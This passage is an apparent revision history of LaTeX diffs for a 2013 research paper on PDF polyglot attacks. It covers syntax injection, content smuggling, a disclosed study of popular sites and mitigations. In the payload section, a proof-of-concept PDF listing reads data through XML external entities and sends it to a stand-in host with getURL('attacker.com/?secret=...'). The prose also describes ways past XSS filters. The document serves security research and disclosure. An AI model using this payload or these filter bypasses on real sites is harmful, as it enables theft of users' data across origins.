 Due to the nature of the PDF, it can without much effort be combined with just 
@@
 \paragraph{PDF as the benign format}
-\todo{Services that accept PDFs, PDFs can be used to hide another malicious format}
+%\todo{Services that accept PDFs, PDFs can be used to hide another malicious format}
 Services like job brokers commonly let the user upload a CV in the form of a PDF-file.
 Before such PDF-files are published to recruiters, they are verified to not 
-contain any malicious payload. An attacker can produce a PDF that is valid and 
-benign, but also a polyglot hiding another malicious format, such as Flash. 
-A proof-of-concept can easily be created by storing the PDF as a static string 
-variable in the malicious flash source code. When the flash is compiled, the 
-source of the PDF is part of the output, making it a valid PDF.
+contain any malicious payload. Such a verification only extends to the PDF format itself.
+An attacker can produce a PDF that is valid and 
+benign, but also a polyglot hiding another malicious format, such as Flash. As 
+described in the content smuggling scenario in Section~\ref{sec:smuggling}, the 
+uploaded PDF file is then embedded on the attacker's web site, but now as the 
+malicious format. Using social engineering, the attacker can persuade 
+the victim to visit the web site.
+
+Creating a PDF/Flash polyglot is no major challenge.
+A proof-of-concept can easily be created by storing the PDF source code as a static string 
+variable in the malicious Flash source code. When compiling Flash, the output is 
+compressed by default to save space, thereby obfuscating the PDF source code. However, tools exist 
+that decompress the Flash files, which restores the plain PDF code.
 
 \paragraph{PDF as the malicious format}
- Given the extensive capabilities of PDF, exploiting a content smuggling 
+As detailed in the content smuggling scenario in Section~\ref{sec:smuggling}, the 
+attacker uploads the PDF polyglot to a vulnerable content hosting service. 
+A server-side verification process will base its verification on the benign formats 
+it expects to receive. The polyglot is designed to verify correctly as the benign format,
+and the verification is likely to miss the malicious PDF components, as it is unaware of the alternate interpretation of the content.
+
+Given the extensive capabilities of the PDF format, exploiting a content smuggling 
 vulnerability with a PDF-based polyglot attack, can be done without much effort.
-A server-side verification process will base its verification on the benign format,
-and is likely to miss the malicious PDF components. To prevent the attack, the 
+To prevent the attack, the 
 verification process have to actively search for and remove PDF specific syntax.
 
-\subsection{PDF communication methods}
+\subsection{PDF payloads}
 %\todo{rewrite section, focus on embedded flash, xxe and code samples}
 %
+As discussed in Section~\ref{sec:payloads}, there are two approaches to exploiting 
+these vulnerabilities; cross-site request forgery, and cross-origin information leakage.
+Both of these require extracting information from the vulnerable service, which is something that can be achieved using the capabilities of the PDF format.
+
 In order to extract information and leak across origins, a communication channel
-is required. PDF documents provide multiple ways of generating HTTP requests. 
-Many of these are cross-origin, but, out of security concerns, only one-way in the sense that 
+is established. PDF documents provide multiple ways of generating HTTP requests; 
+many of which allow cross-origin communication, but are, out of security concerns, only one-way in the sense that 
 the PDF document will never see the result. Therefore, the focus is directed towards 
-two methods that allow bidirectional communication. Since the document will retain the 
+two methods that allow bidirectional communication; XML external entities, and embedded Flash. 
+ Since the document will retain the 
 origin from which it was served, all 
@@
 1 0 obj<<>>stream
-xml = '<!DOCTYPE foo[<!ENTITY x SYSTEM "'+
-	URL+'">]><foo>&x;</foo>'
+xml = '<!DOCTYPE foo[<!ENTITY x ' +
+ 'SYSTEM "'+URL+'">]><foo>&x;</foo>';
 var doc = XMLData.parse(xml);
-getURL('attacker.com/?'+doc.saveXML())
+getURL('attacker.com/?secret='+
+  doc.saveXML())
 endstream
@@
 XSS and thereby also to PDF polyglot attacks, two were susceptible only to PDF based polyglot attacks, and four applied 
-insufficient content filtering, but the input was reflected in a way that prevented exploitation.
+insufficient content filtering, but the input was reflected in a way that prevented exploitation, e.g. the header appeared after 1024 bytes.
 %
@@
 This section gives advice on various mitigation approaches available for each of the
-affected components, from server to client.
+affected components, both server-side and client-side. It should be noted that 
+preventing polyglot attacks in the general case is a complex task, as one would 
+need to take all potentially malicious formats in to account. Mitigating instances of 
+polyglot attacks based on particular formats are significantly more straightforward.
 
@@
 on the kind of services provided. The mitigation recommendations for syntax 
-injection apply to services that rely on user input, and the content smuggling
+injection apply to all services that rely on user input, and the content smuggling
 recommendations apply to services that serve user-supplied files.
@@
 
-To prevent PDF-based syntax injection attack, the task is simpler. The token-set identified in 
+To prevent PDF-based syntax injection attack, the task is simpler. As discussed in Section~\ref{sec:pdf-injection}, the token-set identified in 
 Section~\ref{sec:pdf-injection}, are essential 
-to create valid PDF syntax, namely \emph{'$<$', '$>$', and '/'}. Filtering 
+to create valid PDF syntax. %, namely \emph{'$<$', '$>$', and '/'}.
+Filtering 
 user input to remove or encode these characters effectively mitigates the 
 vulnerability. 
+Luckily, because of the significant overlap with the token-set
+of HTML, many of the contexts where user input can occur are already being protected.
+Special attention is required in contexts are not traditionally filtered for 
+HTML tokens, e.g. JSON.
 
@@
 The current best-practice recommendation from Google~\cite{Google:ContentHosting} 
-on hosting user-supplied content, is to serve the content from an origin that is 
-completely separate, and isolated from the sensitive services. It also describes how 
-Google moved away from sanitizing content, as it was found to be insufficient in 
-many cases. These best-practices successfully prevents content-smuggling 
-attacks in all aspects, as the infiltrated origin is separate from the origin 
-containing sensitive data.
-
-\todo{What about serving as attachment, so that it is not viewed within the browser? How does it work with embedded content?}
-\todo{Problem of transferring credentials between domains for services where the content requires authentication}
+on hosting user-supplied content, is to serve the content from a sandboxed origin that is 
+completely separate, as per SOP, and isolated from the sensitive services. 
+These best-practices successfully prevents content smuggling 
+attacks, as the restrictions of the SOP prevents the content from accessing any sensitive 
+resources in the origin of the web service.
+
+These recommendations comes with a caveat that need to be taken into consideration. Some user supplied 
+content is only meant to be accessible to certain authenticated users, e.g. photos that 
+is only shared with friends. In that case, the service needs to transfer the 
+credentials required to authenticate the user from the sensitive origin to the sandboxed 
+origin, without actually revealing the credentials used in the sensitive origin. 
+Revealing the credentials, e.g. using the same cookies on both origins, defeats 
+the purpose of the sandbox origin entirely. Currently there is no uniform solution 
+to this problem. Some common solutions are encountered: using the hashed 
+credentials of the sensitive origin; or generating public, but obscured, links 
+that are later shared manually.
+
+%\todo{Problem of transferring credentials between domains for services where the content requires authentication}
 
@@
 mismatch between the content-type provided by the server and the type attribute 
-of the \emph{object} tag. By acknowledging that there can be a potential security issue in 
+of the \emph{object} tag. The vulnerability can be mitigated by acknowledging that there can be a potential security issue in 
 interpreting the supplied content in the requested format and alerting the user to this
-threat, the vulnerability can be mitigated.
+threat.
 
@@
 
-As a general rule of thumb, the interpreter at the very least alert the user if the served 
+As a general rule of thumb, the interpreter must at the very least alert the user if the served 
 content-type differs from the expected. A preferred alternative is to 
@@
 Making the parsing more strict and enforcing many of the specified requirements 
-will reduce the attack surface. It is, however, not sufficient for complete 
-mitigation because the PDF format is a container format it is designed to 
+will reduce the attack surface. However, it is not sufficient for complete 
+mitigation. As discussed in Section~\ref{sec:pdf-based-polyglots} the PDF format is a container format; designed to 
 embed syntax from other files. Even when parsing strictly according to 
@@
 documents. Authorization is pending for an in-depth security study of
-a major conference submission system.
+a major conference management system.
 

### 2013-02-21 main.tex
minor edits

@@
 Our findings expose new attack vectors, which we demonstrate both
-conceptually and by a proof-of-concept web pages.
+conceptually and by proof-of-concept web pages.
 
@@
 \paragraph{Scenario}
-The scenario, illustrated in Figure~\ref{fig:injection-scenario}, describe how 
-the attack proceed, from the infiltration of the origin, to the compromise of the victim.
+The scenario, illustrated in Figure~\ref{fig:injection-scenario}, describes how 
+the attack proceeds from the infiltration of the origin to the compromise of the victim.
 The victim in this scenario is an authenticated user of the targeted website, \emph{vulnerable.com}. 

### 2013-02-21 main.tex
Minor edits

--- 2013-02-21 main.tex
@@
 \paragraph{HTML comments}
-No HTML enclosed in comments, "<--" and "-->", will be rendered, and therefore 
+No HTML enclosed in comments, "$<$--" and "--$>$", will be rendered, and therefore 
 filters consider this context safe. To prevent input from escaping the comment by 
-injecting an end comment token, certain filters remove any occurrences of "-->", 
+injecting an end comment token, certain filters remove any occurrences of "--$>$", 
 but leave the rest of the input untouched. HTML comments are meaningless to PDF, 

### 2013-02-21 main.tex
responsible disclosure and new time stamp for test page
Again, minor edits

@@
 %As mentioned, the embedded Flash file inherits the origin of the document.
-An attacker can set an allow-all cross-origin policy, such as in Listing~\ref{lst:crossdomain} 
+An attacker can set an allow-all cross-origin policy, such as in Listing~\ref{lst:crossdomain}, 
 that open up for two way communication.
@@
 web sites from the top 100 Alexa list.
+%
+Following responsible disclosure, we refrain from providing the names of the vulnerable web sites.
 

### 2013-02-21 main.tex
Extended evaluation of Alexa top 100

@@
 targeted service serves the content as its original format, it is in the hands 
-of the attacker to decide how it is interpreted.
+of the attacker to decide how it is interpreted. Examples of 
+such services include dynamic user driven websites, e.g. social networks, search engines, etc.
 %
@@
 users submit files to the service which are subsequently served under the origin of 
-the service. Examples of such potentially vulnerable services are file sharing services, image databases, 
+the service. Examples of such potentially vulnerable services are cloud storage services, image databases, 
 social networks, conference management systems or job broker services. Such a service 
@@
 \begin{table}[h!]
-\begin{tabular}{l||c|c|c}
+\begin{tabular}{l|c|c|c}
 & object & embed & Adobe is default \\ \hline
-Firefox & X & X & X \\ \hline
-Chrome & X & X & --- \\ \hline
-Safari & X & X & X \\ \hline
-Opera & X & X & X \\ \hline
-Internet Explorer & --- & X & X %\\ \hline
+Firefox & Yes & Yes & Yes \\ \hline
+Chrome & Yes & Yes & No \\ \hline
+Safari & Yes & Yes & Yes \\ \hline
+Opera & Yes & Yes & Yes \\ \hline
+Internet Explorer & No & Yes & Yes %\\ \hline
 \end{tabular}
@@
 \subsection{Alexa top 100}
-We have conducted a
-study to evaluate the prevalence of the problem on popular sites, 
+We have conducted two
+studies to evaluate the prevalence of the problem on popular sites, 
 covering the Alexa top 100 websites. Because of their dominance 
 on the web, these websites are also the most exposed to security threats.
-The study covers PDF-based polyglot attacks using syntax injection as the infiltration method.
-It does not involve polyglot attacks based on content smuggling, as 
-potential targets generally require authentication before submitting content.
+The first study covers PDF-based polyglot attacks using syntax injection as the 
+infiltration method; the second covers content smuggling.
+%It does not involve polyglot attacks based on content smuggling, as 
+%potential targets generally require authentication before submitting content.
 We refrain from mentioning names of individual websites to prevent exploitation 
 before the issues have been properly dealt with. Neither do we want to disclose 
-these websites as particularly vulnerable.
-
+these websites as particularly vulnerable. We are in contact with the teams responsible for the websites to help
+mitigate the vulnerabilities.
+
+\paragraph{Syntax injection}
 The study is based on supplying the websites with the benign minimal PDF in 
@@
 that nine websites out of the hundred apply insufficient content filtering with 
-respect to the PDF format. Out of the nine found to be vulnerable;three were susceptible to traditional 
+respect to the PDF format. Out of the nine found to be vulnerable; three were susceptible to traditional 
 XSS and thereby also to PDF polyglot attacks, two were susceptible only to PDF based polyglot attacks, and four applied 
@@
 %
-We are in contact with the teams responsible for the websites to help
-mitigate the vulnerabilities.
+
+The two web sites found susceptible only to polyglot attacks and not XSS attacks
+are of particular interest. They both employ proper measures to protect properly 
+against XSS attacks, and yet fall short in defeating this new breed of attacks.
+
+\begin{enumerate}
+\item The first web site reflected user input in an inline  
+JavaScript context, inside a string. To prevent cross-site scripting in this 
+context, the following measures were taken: the JavaScript string delimiters 
+were properly encoded, the backslash character was properly escaped, and the 
+string "$<$/script$>$" was removed. None of these measures prevent an attacker 
+from injecting valid PDF syntax.
+\item The second website reflected the user input in an HTML-comment context. 
+The only measure taken to prevent XSS attacks in this context was removing any 
+occurrence of the character sequence "--$>$". Again, while successfully preventing 
+XSS attacks, this measure is ineffective in preventing an attacker from injecting PDF syntax.
+\end{enumerate}
+
+\paragraph{Content smuggling}
+Further, a smaller study was conducted, not covering the full Alexa top 100, but 
+targeting popular cloud storage services. 
+This study is based on polyglot content being uploaded to the service and 
+subsequently analyzed to determine which origin it was served under. One major 
+enterprise cloud storage service was found to be susceptible to attacks. The service makes an effort to
+follow current best practices, see Section~\ref{sec:smuggling-mitigation}, for almost all uploaded content; the exception being the user's 
+avatar images that are served under the sensitive origin. An attacker could 
+upload a specially crafted avatar image that, when embedded as PDF on the attackers 
+web site, can access and modify the contents of the victim's cloud storage.
+We are currently advising the service provider to help mitigate this vulnerability.
 
@@
 \subsubsection{Content smuggling}
-
+\label{sec:smuggling-mitigation}
 The current best-practice recommendation from Google~\cite{Google:ContentHosting} 

### 2013-02-21 main.tex
Minor edits..

@@
 of the attacker to decide how it is interpreted. Examples of 
-such services include dynamic user driven websites, e.g. social networks, search engines, etc.
+such services include social networks, search engines, i.e., nearly any dynamic user driven website.
 %
@@
 
-When a PDF document is embedded in a web page, the corresponding plugin 
+When a PDF document is embedded in a web page, the corresponding plug-in 
 is executed to render the content. Recall from Section~\ref{sec:cross-origin} 

### 2013-05-03 main.tex
todo

@@
-%\documentclass{acm_proc_article-sp}
+\documentclass{sig-alternate}
 %\documentclass[10pt, conference, compsocconf]{IEEEtran}
-
-\documentclass[letterpaper,twocolumn,10pt]{article}
-\usepackage{usenix,epsfig,endnotes}
+%\documentclass[letterpaper,twocolumn,10pt]{article}
+\usepackage{epsfig,endnotes}
 
@@
 
+%\author{}
 % \author{\IEEEauthorblockN{Jonas Magazinius} 
@@
 %
+Under our generalization, previous work corresponds to
+instances. For example, we show that GIFAR attacks describe a form of content smuggling, and
+cross-origin CSS attacks describe a form of syntax injection attacks.
+%
+The added value of our paper is a generalized view and focus on new
+instances of polyglots that involve the PDF format.
+
 Two attacker-centric components require special attention; the infiltration of 
@@
 The reader is invited to visit the test page~\cite{Test:Page:12} for
-practical demonstration of the concepts from this section.
+practical demonstration of the attacks from this section. These
+attacks show that the vulnerabilities we focus on are exploitable in practice.
 
@@
 
+Note that although some mitigation discussed below is already in place
+(notably as implemented by the Chrome builtin PDF reader), the state of the art
+is far from being satisfactory. As our paper demonstrates, the
+polyglot attacks are a real threat. It is the paper's main value to
+bring attention to polyglot attacks and the importance of
+mitigation against them.
+
 \subsection{Server-side mitigation}

### 2013-05-08 main.tex
appendix
Fixed most todos

@@
 server from which it originates. 
+\todo{More?} Typically a document is considered to be an HTML-page.
 
@@
 %
-
 Polyglots allow
 multiple interpretation of the content, providing a new space of attack vectors.
+
+\paragraph{Attack vectors}
+\todo{Describe general scenario with forward pointer}
 We present novel attack vectors that are based on (i)
@@
 
-\paragraph{Generalizing polyglots} 
+\paragraph{Generalizing polyglot attacks} 
 The paper is the first to perform a generalization and systematic study of polyglot
@@
 Recall that SOP only allows two documents accessing each others'
-content and resources if they share the origin. Similarly,
+content and resources if they share the origin.
+%\todo{More on SOP}
+Similarly,
 a document can only directly communicate with the server from which it originates. 
@@
 \emph{embed} tags. These 
-tags allow inclusion of resources that might require a 
-plug-in to run. As with images, the content handled by the plug-in retains its origin, 
-but the browsers are forced to rely on the plug-ins to employ correct security 
-measures to prevent information leaks. The plug-in is selected based on the MIME-type of the content, but
+tags allow inclusion of resources that may require a 
+plug-in to run. The plug-in is selected based on the MIME-type of the content, but
 because the server delivering the content might not be able to determine its
-format, the \emph{object} tag allows a developer to set the type-attribute to guide the
+format, the tags allow a developer to set the type-attribute to guide the
 browser in which plug-in to run. When the type attribute is used, the
-corresponding plug-in is run regardless of which MIME-type the server returns
-and it is up to the plug-in to respond to and handle the content it is served. While the containing page is restricted 
-from directly accessing the content handled by the plug-in, a number of plug-ins provide 
-an API for interacting with the plug-in and the data. As we will show, this can lead to 
+corresponding plug-in is run regardless of the MIME-type provided by the server. 
+%
+In the event that the provided MIME-type do not match that for which the plug-in is 
+designed, e.g., \emph{text/html} for a PDF plug-in, it is up to the plug-in to respond to the content it is served.
+Known methods of handling MIME-types, such as content-sniffing, are effective 
+in this situation, but they have to be employed by each and every plug-in.
+Most plug-ins will disregard the MIME-type of the content and attempt to parse 
+it. 
+%
+
+As with images, the content handled by the plug-in is executed in the origin it was served from. 
+This implies that the containing page is restricted 
+from directly accessing the content handled by the plug-in, and that the content can 
+communicate freely with the origin it was loaded from. However,  a number of plug-ins provide 
+an API for interaction between the plug-in and the document.
+The browsers are forced to rely on the plug-ins to employ correct security 
+measures. Section~\ref{sec:eval} shows that even state-of-the-art plug-ins fail to properly do so. As we will show, this can lead to 
 to cross-origin information leaks.
@@
 
+% header
+\subsubsection{Header}
+The header consists of the string "\%PDF-" followed by a version number. 
+The version is denoted by a 
+major and a minor version number of the form "\emph{M.m}". Because the version can 
+be specified elsewhere, the version number is not required to be part of the 
+header.
+
+% objects
+\subsubsection{Objects}
+Objects can be direct or indirect, the difference being that indirect objects 
+has labels which are used for referring to the object from another object. Object 
+labels are numbered and begin with the string "\emph{N n} obj", where "N" is the object number and "n" is the 
+revision number. Similarly object references are of the form "\emph{N n} R".
+The label is optionally ended with the keyword "endobj".
+
+There are eight basic types of basic objects; booleans, integers, strings, names, 
+arrays, dictionaries, streams and the null object. For the intents and purposes 
+of this article, we will focus on the string, dictionary, name and stream objects.
+
+% string objects
+\paragraph{String objects}
+There are two types of strings; literal and hexadecimal. Literal strings are 
+enclosed by the "(" and ")" characters. Any character can occur in a literal 
+string, even parentheses if they are balanced, e.g. a matching closing 
+parenthesis for every opened parenthesis. In hexadecimal strings 
+each character is represented by its corresponding hexadecimal value, enclosed 
+by the "$<$" and "$>$" characters.
+
+% dictionary objects
+\paragraph{Dictionary objects}
+Dictionary objects are a name-value map delimited by the "$<<$" and "$>>$" 
+tokens. The names are name objects and the values are objects of any type.
+% name objects
+Name objects begin with the "/" character, followed by a string of non-whitespace 
+characters. Each dictionary has a type, either specified by the "/Type" name or inferred 
+from the context in which it occurs. The type declares which kind of element the 
+dictionary is describing, e.g. a page or an annotation. Dictionaries form the structure of the document by connecting
+objects through references, e.g. relating a page to its contents. %At least one 
+%dictionary is required to build a PDF document. 
+% actions?
+A special type of dictionary describes \emph{actions}. Actions are triggered when a
+certain event occur, such as a file is opened or a page is displayed, and the action 
+dictionary specify how it is handled. Actions can be used to, among other 
+things, go to a specific page, play a sound, execute JavaScript or launch a command.
+
+% stream objects
+\paragraph{Stream objects}
+A stream is an unlimited sequence of bytes. A stream object shall always be indirect and consists of a 
+dictionary, describing the stream, and the associated stream delimited by the 
+"stream" and "endstream" keywords. 
+%
+According to the specification, the stream dictionary shall contain a \emph{Length} 
+name to specify the length of the stream. In practice this can be omitted as 
+long as the delimiting keywords are in place.
+%
+PDF supports encoding of streams, in which
+case the dictionary describe which filters are required to decode the stream.
+
+% cross-reference
+\subsubsection{Cross-reference}
+The cross-reference section is a record of the location of indirect objects 
+within a file. The location is specified as the byte offset from the beginning 
+of the file. The cross-reference section is opened with the "xref" keyword,
+followed by one record for each indirect object. The cross-reference section 
+will be reconstructed if missing and can therefore be omitted.
+
+% trailer
+\subsubsection{Trailer}
+The trailer is composed of a trailer dictionary, a pointer to the cross-reference 
+section and an end-of-file marker. The trailer dictionary is introduced by the 
+"trailer" keyword. 
+%
+\emph{Root} is in practice the only mandatory name in the trailer dictionary, referencing the root of the 
+%
+document structure. The "startxref" keyword is followed by the number of bytes from 
+the beginning of the file to the first cross-reference section. As with the 
+cross-reference section, it can be omitted. The string "\%\%EOF" marks the 
+end-of-file, but can be omitted.
+
+\subsection{PDF-based polyglots}
+\label{sec:pdf-based-polyglots}
+Several design choices in the PDF specification make the format particularly 
+suitable for making polyglots. One such design choice is the error tolerant 
+parser. This is in part motivated by PDF being a container format, 
+%of which the 
+another design choice which implies
+%implication is 
+that a PDF file can, by design, contain foreign syntax that 
+could interfere with the syntax of the file. Another motivation is that PDF 
+files are designed to be both forward- and backward-compatible. Readers 
+implementing an older version of the specification do not recognize new 
+features and behave as if they were not present in the file. 
+%
+The implementation notes of the specification describes some exceptions to the
+requirements of the specification, such as the header can occur 
+anywhere within the first 1024 bytes of the file. This flexibility gives plenty of room for 
+combining with syntax of another format.
+%
+The specification declares many components to be required in a
+PDF file, but as can be seen in Section~\ref{sec:format}, in practice several 
+components can be omitted~\cite{Wolf:CCC10}. The code in Listing~\ref{lst:minimal-pdf} shows the 
+minimal syntax required for a malformed, but valid PDF file.
+%incrementally 
+%updated by appending updated versions of existing objects to 
+%the end of the file. In fact, 
+%and formats. This and the fact that it is designed to be robust against errors,
+%provides us with a format that is powerful, flexible and ideal for creating
+%malicious polyglots.
+
+\begin{lstlisting}[label=lst:minimal-pdf, caption=Minimal PDF file]
+%PDF-
+trailer<</Root<</Pages<<>>>>>>
+\end{lstlisting}
+
+% - Execute JavaScript
+% - Embed flash files
+% - Launch commands
+% - Network requests
+
+Furthermore the PDF format is of particular interest to us because of its 
+many capabilities. Some examples include executing JavaScript, launching commands, 
+and issuing HTTP requests. The HTTP requests are restricted to the origin of the 
+PDF file, and will include any cookies associated with that origin. 
+Adobe Reader also includes a flash 
+runtime to play embedded flash files on systems that do
+not have the Flash runtime installed. %Considering that it might be a conscious decision
+%of the user to refuse a flash player,
+
+%\subsection{Embedded PDF documents}
+
+When a PDF document is embedded in a web page, the corresponding plug-in 
+is executed to render the content. Recall from Section~\ref{sec:cross-origin} 
+that the plug-in is selected based 
+on the MIME-type, either supplied by the server or in the type attribute
+%
+with preference for the later.
+%
+Also recall
+that the browser rely on the plug-in to handle the situation when the MIME-type 
+supplied by the server is inconsistent with the MIME-type of the plug-in.
+In the case of the Adobe Reader plug-in, it disregards the MIME-type
+supplied by the server and will attempt to interpret any content as PDF. 
+Listing~\ref{lst:embed-pdf} shows how 
+arbitrary content can be rendered as PDF format.
+
+\begin{lstlisting}[label=lst:embed-pdf, caption=HTML for embedding PDF content]
+<embed type="application/pdf" 
+src="vulnerable.com/?input=%PDF...">
+\end{lstlisting}
+
+In recent versions of Adobe Reader certain measures has been taken to prevent 
+creating PDF-based polyglots. In accordance with our recommendations Adobe Reader 
+has made the parsing more strict by attempting to match the first bytes of the 
+file against a set of known signatures. If 
+a match is found, the parser will abort loading of the document. The problem of 
+this approach is that there are a number of file formats that lack a reliable 
+signature, e.g., HTML. Also, for this approach to be reliable, the signature 
+must match the signature enforced by other interpreters of the format. A notable 
+counter example is the signature used for the JPG format. While the signature is 
+correct according to the specification of the format, several JPG interpreters
+will allow slightly malformed signatures. Such a malformed signature will bypass 
+the check in Adobe Reader and still be rendered correctly in a viewer. This opens up for PDF-based
+polyglot attacks.
+
+\subsection{PDF attacks}
+
+As explained in Section~\ref{\todo{ref}} there are two vectors for polyglot 
+attacks; \emph{syntax injection} and \emph{content smuggling}. PDF is a suitable 
+format for both vectors as it is both a text based format with error tolerant parsing, 
+and has widespread acceptance as a document format, often preferred over 
+other document formats.
+
+\subsubsection{Syntax injection}
+\label{sec:pdf-injection}
+As the scenario details in Section~\ref{sec:injection}, the attacker in a syntax 
+injection attack manipulates a vulnerable service to include PDF syntax in existing content, e.g. HTML-documents.
+The PDF syntax is typically injected through user input used by the vulnerable service in the composition of documents.
+%
+An example of a suitable fragment to inject is shown in Listing~\ref{lst:xml-pdf}.
+%
+The content is subsequently 
+embedded in the attackers page as PDF, as exemplified in Listing~\ref{lst:embed-pdf}.
+As mentioned in Section~\ref{sec:pdf-based-polyglots}, the embedded PDF can issue 
+requests to the origin it came from, carrying the cookies associated with that origin.
+These requests allow for the extraction of sensitive user data that can either be 
+communicated back to the attacker, or be leveraged in further attacks.
+
+Thus far, exploitation of vulnerable services have been discussed, excluding the specific 
+conditions under which a service is vulnerable. In order to exploit the 
+vulnerability, the injected syntax must pass through any existing filters 
+unchanged or at least with its semantics preserved. If user input in an 
+HTML-document is not sanitized, any syntax would be unchanged and 
+the service is vulnerable to less sophisticated attacks, e.g. cross-site scripting, 
+therefore sanitized user input is of greater concern.
+%
+Based on the PDF samples in Listings~\ref{lst:minimal-pdf} and~\ref{lst:xml-pdf}, we can derive 
+the set of tokens required to build a PDF. Assuming that alpha-numeric characters 
+pass through a sanitization filter unmodified, the set of tokens is $\{\%, <<, >>, /\}$.
+As can be noted, there is a small but significant overlap with the tokens of HTML, 
+which implies that many websites protected against cross-site scripting attacks 
+are also protected against PDF-based polyglot attacks. One of the problems of 
+filtering input for inclusion in a web page are the many contexts in which the 
+input can be included. A problem made even more complex by the diversity of 
+languages the page contains. Language incompatibilities force context dependent 
+filtering, where the same input is treated differently based on the context in 
+which it is included. In certain contexts angle brackets are often left untouched by filters.
+
+\paragraph{HTML comments}
+No HTML enclosed in comments, "$<$--" and "--$>$", will be rendered, and therefore 
+filters consider this context safe. To prevent input from escaping the comment by 
+injecting an end comment token, certain filters remove any occurrences of "--$>$", 
+but leave the rest of the input untouched. HTML comments are meaningless to PDF, 
+and the result is a valid HTML/PDF polyglot.
+
+\paragraph{JavaScript strings}
+In an in-line JavaScript context, user input is often included in the shape of a 
+JavaScript string, delimited by single or double quotes. In this context only a 
+few characters require encoding, as they can break the string context. Naturally, 
+any single or double quotes need escaping, as well as any carriage return or 
+line feed characters. In the spirit of making minimal changes to the input, 
+certain websites only escape these characters. This is sufficient to prevent cross-site 
+scripting attacks, but fail to protect against PDF-based polyglot attacks.
+
+Not only in-line JavaScript fall short in this regard. JavaScript object notation 
+(JSON) is used in modern websites as a data transport. This is particularly 
+common in websites that provide an API to interact with the offered services.
+JSON encoded information suffer the same problem as in-line JavaScript, thereby
+extending the attack surface further.
+
+\subsubsection{Content smuggling}
+
+Due to the nature of the PDF, it can without much effort be combined with just 
+about any other format. This provides ample opportunity to create malicious 
+polyglots where PDF is either the benign or the malicious format. Consequently, 
+this significantly expands the attack surface, making it important to take 
+measures to protect against these attacks.
+
+\paragraph{PDF as the benign format}
+%\todo{Services that accept PDFs, PDFs can be used to hide another malicious format}
+Services like job brokers commonly let the user upload a CV in the form of a PDF-file.
+Before such PDF-files are published to recruiters, they are verified to not 
+contain any malicious payload. Such a verification only extends to the PDF format itself.
+An attacker can produce a PDF that is valid and 
+benign, but also a polyglot hiding another malicious format, such as Flash. As 
+described in the content smuggling scenario in Section~\ref{sec:smuggling}, the 
+uploaded PDF file is then embedded on the attacker's web site, but now as the 
+malicious format. Using social engineering, the attacker can persuade 
+the victim to visit the web site.
+
+Creating a PDF/Flash polyglot is no major challenge.
+A proof-of-concept can easily be created by storing the PDF source code as a static string 
+variable in the malicious Flash source code. When compiling Flash, the output is 
+compressed by default to save space, thereby obfuscating the PDF source code. However, tools exist 
+that decompress the Flash files, which restores the plain PDF code.
+
+\paragraph{PDF as the malicious format}
+As detailed in the content smuggling scenario in Section~\ref{sec:smuggling}, the 
+attacker uploads the PDF polyglot to a vulnerable content hosting service. 
+A server-side verification process will base its verification on the benign formats 
+it expects to receive. The polyglot is designed to verify correctly as the benign format,
+and the verification is likely to miss the malicious PDF components, as it is unaware of the alternate interpretation of the content.
+
+Given the extensive capabilities of the PDF format, exploiting a content smuggling 
+vulnerability with a PDF-based polyglot attack, can be done without much effort.
+To prevent the attack, the 
+verification process have to actively search for and remove PDF specific syntax.
+The impact of exploitation depends on the payload used in the attack.
+
+\subsection{PDF payloads}
+%\todo{rewrite section, focus on embedded flash, xxe and code samples}
+%
+As discussed in Section~\ref{sec:payloads}, there are two approaches to exploiting 
+these vulnerabilities; cross-site request forgery, and cross-origin information leakage.
+Both of these require extracting information from the vulnerable service, which is something that can be achieved using the capabilities of the PDF format.
+
+In order to extract information and leak across origins, a communication channel
+is established. PDF documents provide multiple ways of generating HTTP requests; 
+many of which allow cross-origin communication, but are, out of security concerns, only one-way in the sense that 
+the PDF document will never see the result. Therefore, the focus is directed towards 
+two methods that allow bidirectional communication; XML external entities, and embedded Flash. 
+ Since the document will retain the 
+origin from which it was served, all 
+requests issued from the document will include any cookies associated with the target origin.
+
+%When embedded in a web page, many of the PDF communication methods utilize
+%the underlying browser to make requests by navigating the browser to the target 
+%URL. This will unload the current page in which the document is embedded. Arbitrary page 
+%navigation is allowed with respect to SOP, since the response is not visible 
+%to the document. Such methods can be used in CSRF attacks, but would 
+%defeat the purpose of requesting information as the document cannot process the 
+%response.
+
+% Cross-origin leaks
+%To leak information across origins, a communication channel is 
+%required between the attacker and the target. PDF provides the necessary means 
+%to mediate this information leakage. The flow of information can be divided into 
+%two steps, extracting information from the target and delivering it to the attacker.
+%Each requiring its own communication methods.
+
+%\subsubsection{The target}
+%There are two methods for a PDF file to communicate with the server it originates from, 
+%both allowing it to read the response: from JavaScript using XML external entities 
+%and from an embedded flash file.
+
+\paragraph{XML External Entities}
+The PDF JavaScript API includes a method to parse XML documents, called 
+XMLData.parse. The XML document being processed may in turn rely on external entities, 
+required for the parsing of the document, which the XML parser will request. The request is 
+bound to the origin of the document, and the response is included in the XML document. 
+The source code of the XML document reflects this response and can be retrieved at a later point,
+resulting in a bidirectional communication channel.
+%
+As the response 
+is included in the XML, the result has to be well-formed XML. This puts a 
+restriction on the content that can be requested using this method. Considering 
+that HTML pages are rarely well-formed this method may be too restricted in practice.
+
+Listing~\ref{lst:xml-pdf} contains an example PDF document that uses XML external 
+entities. Note that the one-way method \emph{getURL} is used to communicate the 
+information back to the attacker. Given the compact size of the example, it is useful for the syntax 
+injection scenario in Section~\ref{sec:injection}, which require injection of 
+small syntax fragments.
+
+As of version 10.1.5, in accordance with our recommendations,  XML external entities 
+has been removed. Thereby the risks of leakage of sensitive information is significantly reduced.
+
+\begin{lstlisting}[label=lst:xml-pdf, caption=PDF using XML for communication]
+%PDF-
+1 0 obj<<>>stream
+xml = '<!DOCTYPE foo[<!ENTITY x ' +
+ 'SYSTEM "'+URL+'">]><foo>&x;</foo>';
+var doc = XMLData.parse(xml);
+getURL('attacker.com/?secret='+
+  doc.saveXML())
+endstream
+trailer<</Root
+   <</Pages<<>>
+      /OpenAction
+      <</S/JavaScript/JS 1 0 R>>
+   >>
+>>
+\end{lstlisting}
+
+\paragraph{Embedded Flash}
+By embedding a Flash file in the PDF document the capabilities of the format can be 
+extended even further. The Flash runtime supports bidirectional communication in 
+accordance with SOP.
+%
+The embedded Flash inherits the origin of the PDF document, thus it can 
+request and read any document from the originating server. Unlike the XML
+method, there are no restrictions on what content can be requested, thus making 
+it the most versatile of the available communication methods. The only drawback 
+using this approach is the significant increase in terms of file size. Even the compact 
+flash code in Listing~\ref{lst:flash-pdf} will result in a 6 kB Flash file. 
+This suggests that this method might be better suited for the content smuggling 
